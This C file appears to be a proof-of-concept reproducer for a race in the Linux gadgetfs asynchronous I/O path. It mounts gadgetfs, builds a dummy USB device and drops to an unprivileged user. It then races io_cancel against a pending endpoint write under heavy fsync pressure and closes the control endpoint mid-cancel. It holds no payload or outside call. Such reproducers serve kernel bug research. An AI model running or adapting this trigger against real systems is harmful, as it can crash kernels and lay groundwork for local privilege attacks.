#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <linux/aio_abi.h>
#include <linux/usb/ch9.h>
#include <linux/usbdevice_fs.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>

#define EP0_PATH "/dev/gadget/dummy_udc"
#define EP_PATH "/dev/gadget/ep1in-bulk"
#define XFER_LEN 65
#define REQUESTS 1
#define PRESSURE_REQUESTS 1536
#define PRESSURE_THRESHOLD 1024
#define PRESSURE_BYTES (64UL * 1024 * 1024)
#define PRESSURE_CHUNK (1024UL * 1024)

struct ep7 {
	uint8_t bLength, bDescriptorType, bEndpointAddress, bmAttributes;
	uint16_t wMaxPacketSize;
	uint8_t bInterval;
} __attribute__((packed));

struct desc_blob {
	uint32_t tag;
	struct usb_config_descriptor cfg;
	struct usb_interface_descriptor intf;
	struct ep7 ep_out, ep_in;
	struct usb_device_descriptor dev;
} __attribute__((packed));

struct ep_msg {
	uint32_t tag;
	struct ep7 ep;
} __attribute__((packed));

static aio_context_t ctx;
static struct iocb *cbs;
static atomic_uint cancel_ready_count;
static atomic_int abort_cancel;
static atomic_uint cancel_done_count;
static atomic_uint cancel_einprogress;
static atomic_uint cancel_einval;
static atomic_uint cancel_other;
static pthread_barrier_t cancel_barrier;

struct cancel_arg {
	unsigned int index;
};

struct fsync_pressure {
	aio_context_t ctx;
	struct iocb *cbs;
	struct iocb **list;
	struct io_event *events;
	int fd;
	atomic_int ready;
	atomic_int release;
	int threshold_reached;
	long submitted;
	long reaped;
	long max_outstanding;
	int submit_errno;
};

static inline void cpu_pause(void)
{
	__asm__ __volatile__("pause");
}

static long xio_setup(unsigned nr, aio_context_t *c)
{
	return syscall(SYS_io_setup, nr, c);
}

static long xio_destroy(aio_context_t c)
{
	return syscall(SYS_io_destroy, c);
}

static long xio_submit(aio_context_t c, long nr, struct iocb **list)
{
	return syscall(SYS_io_submit, c, nr, list);
}

static long xio_cancel(aio_context_t c, struct iocb *iocb,
		       struct io_event *event)
{
	return syscall(SYS_io_cancel, c, iocb, event);
}

static long xio_getevents(aio_context_t c, long min_nr, long nr,
			  struct io_event *events, struct timespec *timeout)
{
	return syscall(SYS_io_getevents, c, min_nr, nr, events, timeout);
}

static void pin_cpu(int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	if (sched_setaffinity(0, sizeof(set), &set)) {
		perror("sched_setaffinity");
		exit(20);
	}
}

static int read_effective_caps(unsigned long long *caps)
{
	char line[256];
	FILE *file;

	file = fopen("/proc/self/status", "re");
	if (!file)
		return -1;
	while (fgets(line, sizeof(line), file)) {
		if (sscanf(line, "CapEff:\t%llx", caps) == 1) {
			fclose(file);
			return 0;
		}
	}
	fclose(file);
	return -1;
}

static int drop_to_unprivileged_user(void)
{
	struct sched_param param;
	unsigned long long caps;

	if (setgroups(0, NULL) || setresgid(1000, 1000, 1000) ||
	    setresuid(1000, 1000, 1000) ||
	    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0))
		return -1;
	if (getuid() != 1000 || geteuid() != 1000 || getgid() != 1000 ||
	    getegid() != 1000 || getgroups(0, NULL) != 0)
		return -1;
	if (sched_getscheduler(0) != SCHED_OTHER ||
	    sched_getparam(0, &param) || param.sched_priority != 0)
		return -1;
	if (read_effective_caps(&caps) || caps != 0)
		return -1;

	fprintf(stderr,
		"trigger uid=%u euid=%u gid=%u egid=%u policy=%d capeff=%016llx\n",
		(unsigned)getuid(), (unsigned)geteuid(), (unsigned)getgid(),
		(unsigned)getegid(), sched_getscheduler(0), caps);
	return 0;
}

static int write_token(int fd)
{
	char token = 'R';

	return write(fd, &token, 1) == 1 ? 0 : -1;
}

static int read_token(int fd)
{
	char token;

	return read(fd, &token, 1) == 1 ? 0 : -1;
}

static int dirty_pressure_file(int fd)
{
	unsigned char *buffer;
	unsigned long written = 0;

	buffer = malloc(PRESSURE_CHUNK);
	if (!buffer)
		return -1;
	memset(buffer, 'F', PRESSURE_CHUNK);
	while (written < PRESSURE_BYTES) {
		ssize_t ret = write(fd, buffer, PRESSURE_CHUNK);

		if (ret <= 0) {
			free(buffer);
			return -1;
		}
		written += ret;
	}
	free(buffer);
	return 0;
}

static int write_descriptors(int fd)
{
	struct desc_blob d = { };

	d.cfg.bLength = USB_DT_CONFIG_SIZE;
	d.cfg.bDescriptorType = USB_DT_CONFIG;
	d.cfg.wTotalLength = USB_DT_CONFIG_SIZE + USB_DT_INTERFACE_SIZE +
			     2 * sizeof(struct ep7);
	d.cfg.bNumInterfaces = 1;
	d.cfg.bConfigurationValue = 1;
	d.cfg.bmAttributes = USB_CONFIG_ATT_ONE;
	d.cfg.bMaxPower = 1;
	d.intf.bLength = USB_DT_INTERFACE_SIZE;
	d.intf.bDescriptorType = USB_DT_INTERFACE;
	d.intf.bNumEndpoints = 2;
	d.intf.bInterfaceClass = 0xff;
	d.ep_out.bLength = sizeof(struct ep7);
	d.ep_out.bDescriptorType = USB_DT_ENDPOINT;
	d.ep_out.bEndpointAddress = 1;
	d.ep_out.bmAttributes = USB_ENDPOINT_XFER_BULK;
	d.ep_out.wMaxPacketSize = 64;
	d.ep_in = d.ep_out;
	d.ep_in.bEndpointAddress = 0x81;
	d.dev.bLength = USB_DT_DEVICE_SIZE;
	d.dev.bDescriptorType = USB_DT_DEVICE;
	d.dev.bcdUSB = 0x0200;
	d.dev.bDeviceClass = USB_CLASS_VENDOR_SPEC;
	d.dev.bMaxPacketSize0 = 64;
	d.dev.idVendor = 0x1d6b;
	d.dev.idProduct = 0x0104;
	d.dev.bcdDevice = 1;
	d.dev.bNumConfigurations = 1;
	return write(fd, &d, sizeof(d)) == (ssize_t)sizeof(d) ? 0 : -1;
}

static int enable_endpoint(int fd)
{
	struct ep_msg m = { };

	m.tag = 1;
	m.ep.bLength = sizeof(struct ep7);
	m.ep.bDescriptorType = USB_DT_ENDPOINT;
	m.ep.bEndpointAddress = 0x81;
	m.ep.bmAttributes = USB_ENDPOINT_XFER_BULK;
	m.ep.wMaxPacketSize = 64;
	return write(fd, &m, sizeof(m)) == (ssize_t)sizeof(m) ? 0 : -1;
}

static int read_trim(const char *path, char *out, size_t size)
{
	int fd = open(path, O_RDONLY | O_CLOEXEC);
	ssize_t n;

	if (fd < 0)
		return -1;
	n = read(fd, out, size - 1);
	close(fd);
	if (n <= 0)
		return -1;
	out[n] = 0;
	while (n > 0 && (out[n - 1] == '\n' || out[n - 1] == ' '))
		out[--n] = 0;
	return 0;
}

static int open_usb_device(void)
{
	DIR *dir = opendir("/sys/bus/usb/devices");
	struct dirent *de;
	char path[512], vid[32], pid[32], bus[32], dev[32], node[128];
	int fd = -1;

	if (!dir)
		return -1;
	while ((de = readdir(dir))) {
		if (de->d_name[0] == '.')
			continue;
		snprintf(path, sizeof(path), "/sys/bus/usb/devices/%s/idVendor",
			 de->d_name);
		if (read_trim(path, vid, sizeof(vid)))
			continue;
		snprintf(path, sizeof(path), "/sys/bus/usb/devices/%s/idProduct",
			 de->d_name);
		if (read_trim(path, pid, sizeof(pid)) || strcmp(vid, "1d6b") ||
		    strcmp(pid, "0104"))
			continue;
		snprintf(path, sizeof(path), "/sys/bus/usb/devices/%s/busnum",
			 de->d_name);
		if (read_trim(path, bus, sizeof(bus)))
			continue;
		snprintf(path, sizeof(path), "/sys/bus/usb/devices/%s/devnum",
			 de->d_name);
		if (read_trim(path, dev, sizeof(dev)))
			continue;
		snprintf(node, sizeof(node), "/dev/bus/usb/%03d/%03d",
			 atoi(bus), atoi(dev));
		fd = open(node, O_RDWR | O_CLOEXEC);
		break;
	}
	closedir(dir);
	if (fd >= 0) {
		int intf = 0;

		if (ioctl(fd, USBDEVFS_CLAIMINTERFACE, &intf)) {
			close(fd);
			fd = -1;
		}
	}
	return fd;
}

static int wait_for_usb_device(void)
{
	int fd;

	for (unsigned int i = 0; i < 1000000; i++) {
		fd = open_usb_device();
		if (fd >= 0)
			return fd;
		sched_yield();
	}
	return -1;
}

static int wait_for_endpoint(void)
{
	for (unsigned int i = 0; i < 1000000; i++) {
		if (!access(EP_PATH, F_OK))
			return 0;
		sched_yield();
	}
	return -1;
}

static void *cancel_thread(void *opaque)
{
	struct cancel_arg *arg = opaque;
	struct io_event event = { };
	long ret;
	int saved_errno;

	pin_cpu(0);
	atomic_fetch_add_explicit(&cancel_ready_count, 1, memory_order_release);
	pthread_barrier_wait(&cancel_barrier);
	if (atomic_load_explicit(&abort_cancel, memory_order_acquire))
		return NULL;

	errno = 0;
	ret = xio_cancel(ctx, &cbs[arg->index], &event);
	saved_errno = errno;
	if (ret == -1 && saved_errno == EINPROGRESS)
		atomic_fetch_add_explicit(&cancel_einprogress, 1,
					  memory_order_relaxed);
	else if (ret == -1 && saved_errno == EINVAL)
		atomic_fetch_add_explicit(&cancel_einval, 1,
					  memory_order_relaxed);
	else
		atomic_fetch_add_explicit(&cancel_other, 1,
					  memory_order_relaxed);
	atomic_fetch_add_explicit(&cancel_done_count, 1, memory_order_release);
	return NULL;
}

static void *fsync_pressure_thread(void *opaque)
{
	struct fsync_pressure *pressure = opaque;
	long done;

	pin_cpu(0);
	errno = 0;
	pressure->submitted = xio_submit(pressure->ctx, PRESSURE_REQUESTS,
						pressure->list);
	pressure->submit_errno = errno;
	if (pressure->submitted > 0) {
		done = xio_getevents(pressure->ctx, 0, pressure->submitted,
				     pressure->events, NULL);
		if (done > 0)
			pressure->reaped = done;
		pressure->max_outstanding =
			pressure->submitted - pressure->reaped;
		if (pressure->max_outstanding >= PRESSURE_THRESHOLD)
			pressure->threshold_reached = 1;
	}
	atomic_store_explicit(&pressure->ready, 1, memory_order_release);
	while (!atomic_load_explicit(&pressure->release, memory_order_acquire))
		cpu_pause();
	return NULL;
}

static void *dirty_writer_thread(void *opaque)
{
	struct fsync_pressure *pressure = opaque;
	unsigned char *buffer;
	off_t offset = 0;

	pin_cpu(2);
	buffer = malloc(PRESSURE_CHUNK);
	if (!buffer)
		return NULL;
	memset(buffer, 'W', PRESSURE_CHUNK);
	while (!atomic_load_explicit(&pressure->release,
					     memory_order_acquire)) {
		if (pwrite(pressure->fd, buffer, PRESSURE_CHUNK, offset) <= 0)
			break;
		offset += PRESSURE_CHUNK;
		if (offset >= (off_t)PRESSURE_BYTES)
			offset = 0;
	}
	free(buffer);
	return NULL;
}

static int run_unprivileged_trigger(int ep0)
{
	struct fsync_pressure pressure = { };
	struct io_event *pressure_events;
	struct io_event *events;
	unsigned char *buffer;
	struct iocb **list;
	struct cancel_arg *args;
	pthread_attr_t attr;
	pthread_t pressure_thread;
	pthread_t writer_thread;
	pthread_t *threads;
	long submit_ret, event_count, destroy_ret, pressure_event_count;
	unsigned int i;
	int epfd, pressure_fd;

	atomic_store(&cancel_ready_count, 0);
	atomic_store(&abort_cancel, 0);
	atomic_store(&cancel_done_count, 0);
	atomic_store(&cancel_einprogress, 0);
	atomic_store(&cancel_einval, 0);
	atomic_store(&cancel_other, 0);
	epfd = open(EP_PATH, O_RDWR | O_CLOEXEC);
	if (epfd < 0 || enable_endpoint(epfd))
		return 21;
	if (xio_setup(REQUESTS * 2, &ctx) < 0)
		return 22;

	buffer = aligned_alloc(64, REQUESTS * 128);
	cbs = calloc(REQUESTS, sizeof(*cbs));
	list = calloc(REQUESTS, sizeof(*list));
	events = calloc(REQUESTS, sizeof(*events));
	threads = calloc(REQUESTS, sizeof(*threads));
	args = calloc(REQUESTS, sizeof(*args));
	if (!buffer || !cbs || !list || !events || !threads || !args)
		return 23;
	memset(buffer, 'U', REQUESTS * 128);
	for (i = 0; i < REQUESTS; i++) {
		cbs[i].aio_data = 0x554e42494e440000ULL + i;
		cbs[i].aio_fildes = epfd;
		cbs[i].aio_lio_opcode = IOCB_CMD_PWRITE;
		cbs[i].aio_buf =
			(uint64_t)(uintptr_t)(buffer + i * 128);
		cbs[i].aio_nbytes = XFER_LEN;
		list[i] = &cbs[i];
	}

	errno = 0;
	submit_ret = xio_submit(ctx, REQUESTS, list);
	if (submit_ret != REQUESTS) {
		fprintf(stderr, "io_submit=%ld errno=%d\n", submit_ret, errno);
		return 24;
	}

	pressure_fd = open("/tmp/gadgetfs-aio-fsync-pressure",
			   O_CREAT | O_RDWR | O_TRUNC | O_CLOEXEC, 0600);
	if (pressure_fd < 0 || dirty_pressure_file(pressure_fd) ||
	    xio_setup(PRESSURE_REQUESTS * 2, &pressure.ctx) < 0)
		return 25;
	pressure.cbs = calloc(PRESSURE_REQUESTS, sizeof(*pressure.cbs));
	pressure.list = calloc(PRESSURE_REQUESTS, sizeof(*pressure.list));
	pressure_events = calloc(PRESSURE_REQUESTS, sizeof(*pressure_events));
	if (!pressure.cbs || !pressure.list || !pressure_events)
		return 26;
	for (i = 0; i < PRESSURE_REQUESTS; i++) {
		pressure.cbs[i].aio_data = 0x4653594e43000000ULL + i;
		pressure.cbs[i].aio_fildes = pressure_fd;
		pressure.cbs[i].aio_lio_opcode = IOCB_CMD_FSYNC;
		pressure.list[i] = &pressure.cbs[i];
	}
	pressure.events = pressure_events;
	pressure.fd = pressure_fd;
	atomic_store(&pressure.ready, 0);
	atomic_store(&pressure.release, 0);

	if (pthread_attr_init(&attr) ||
	    pthread_attr_setstacksize(&attr, 128 * 1024) ||
	    pthread_barrier_init(&cancel_barrier, NULL, REQUESTS + 1))
		return 20;
	for (i = 0; i < REQUESTS; i++) {
		args[i].index = i;
		if (pthread_create(&threads[i], &attr, cancel_thread, &args[i]))
			return 20;
	}
	while (atomic_load_explicit(&cancel_ready_count,
					   memory_order_acquire) != REQUESTS)
		sched_yield();
	if (pthread_create(&pressure_thread, &attr, fsync_pressure_thread,
			   &pressure))
		return 27;
	if (pthread_create(&writer_thread, &attr, dirty_writer_thread,
			   &pressure))
		return 27;
	pthread_attr_destroy(&attr);
	while (!atomic_load_explicit(&pressure.ready, memory_order_acquire))
		sched_yield();
	if (!pressure.threshold_reached) {
		fprintf(stderr,
			"fsync pressure threshold not reached: submitted=%ld "
			"reaped=%ld max_outstanding=%ld errno=%d\n",
			pressure.submitted, pressure.reaped,
			pressure.max_outstanding, pressure.submit_errno);
		atomic_store_explicit(&pressure.release, 1,
					      memory_order_release);
		atomic_store_explicit(&abort_cancel, 1, memory_order_release);
		pthread_barrier_wait(&cancel_barrier);
		for (i = 0; i < REQUESTS; i++)
			pthread_join(threads[i], NULL);
		pthread_join(pressure_thread, NULL);
		pthread_join(writer_thread, NULL);
		pthread_barrier_destroy(&cancel_barrier);
		return 28;
	}
	pthread_barrier_wait(&cancel_barrier);
	while (!atomic_load_explicit(&cancel_einprogress, memory_order_acquire) &&
	       atomic_load_explicit(&cancel_done_count,
				    memory_order_acquire) != REQUESTS)
		sched_yield();
	if (!atomic_load_explicit(&cancel_einprogress, memory_order_acquire)) {
		fprintf(stderr, "no cancellation reached EINPROGRESS\n");
		return 29;
	}

	close(ep0);
	for (i = 0; i < REQUESTS; i++)
		pthread_join(threads[i], NULL);
	pthread_barrier_destroy(&cancel_barrier);
	atomic_store_explicit(&pressure.release, 1, memory_order_release);
	pthread_join(pressure_thread, NULL);
	pthread_join(writer_thread, NULL);

	event_count = xio_getevents(ctx, 0, REQUESTS, events, NULL);
	destroy_ret = xio_destroy(ctx);
	pressure_event_count = xio_getevents(pressure.ctx, 0,
					     PRESSURE_REQUESTS,
					     pressure_events, NULL);
	xio_destroy(pressure.ctx);
	fprintf(stderr,
		"uid=%d submit=%ld cancel_einprogress=%u cancel_einval=%u "
		"cancel_other=%u events=%ld destroy=%ld fsync_submit=%ld "
		"fsync_events=%ld fsync_max_outstanding=%ld\n",
		getuid(), submit_ret, atomic_load(&cancel_einprogress),
		atomic_load(&cancel_einval), atomic_load(&cancel_other),
		event_count, destroy_ret, pressure.submitted,
		pressure.reaped + pressure_event_count,
		pressure.max_outstanding);

	close(epfd);
	close(pressure_fd);
	unlink("/tmp/gadgetfs-aio-fsync-pressure");
	free(buffer);
	free(cbs);
	free(list);
	free(events);
	free(threads);
	free(args);
	free(pressure.cbs);
	free(pressure.list);
	free(pressure_events);
	return 0;
}

int main(void)
{
	int child_to_parent[2], parent_to_child[2];
	int ep0, status, usbfd;
	pid_t child;

	if (getuid() != 0 || geteuid() != 0) {
		fprintf(stderr, "root is required for setup\n");
		return 1;
	}
	pin_cpu(1);
	mkdir("/dev/gadget", 0755);
	if (mount("gadgetfs", "/dev/gadget", "gadgetfs", 0, NULL) &&
	    errno != EBUSY) {
		perror("mount gadgetfs");
		return 2;
	}
	if (chown(EP0_PATH, 1000, 1000) || chmod(EP0_PATH, 0600))
		return 3;
	if (pipe2(child_to_parent, O_CLOEXEC) ||
	    pipe2(parent_to_child, O_CLOEXEC))
		return 4;

	child = fork();
	if (child < 0)
		return 5;
	if (child == 0) {
		close(child_to_parent[0]);
		close(parent_to_child[1]);
		if (drop_to_unprivileged_user()) {
			perror("drop_to_unprivileged_user");
			return 10;
		}
		ep0 = open(EP0_PATH, O_RDWR | O_CLOEXEC);
		if (ep0 < 0 || write_descriptors(ep0))
			return 11;
		if (write_token(child_to_parent[1]) ||
		    read_token(parent_to_child[0]))
			return 12;
		close(child_to_parent[1]);
		close(parent_to_child[0]);
		return run_unprivileged_trigger(ep0);
	}

	close(child_to_parent[1]);
	close(parent_to_child[0]);
	if (read_token(child_to_parent[0]))
		return 6;
	if (wait_for_endpoint())
		return 7;
	usbfd = wait_for_usb_device();
	if (usbfd < 0)
		return 8;
	if (chown(EP_PATH, 1000, 1000) || chmod(EP_PATH, 0600))
		return 9;
	if (write_token(parent_to_child[1]))
		return 10;
	close(child_to_parent[0]);
	close(parent_to_child[1]);

	if (waitpid(child, &status, 0) < 0)
		return 11;
	close(usbfd);
	if (WIFEXITED(status))
		return WEXITSTATUS(status);
	return 12;
}
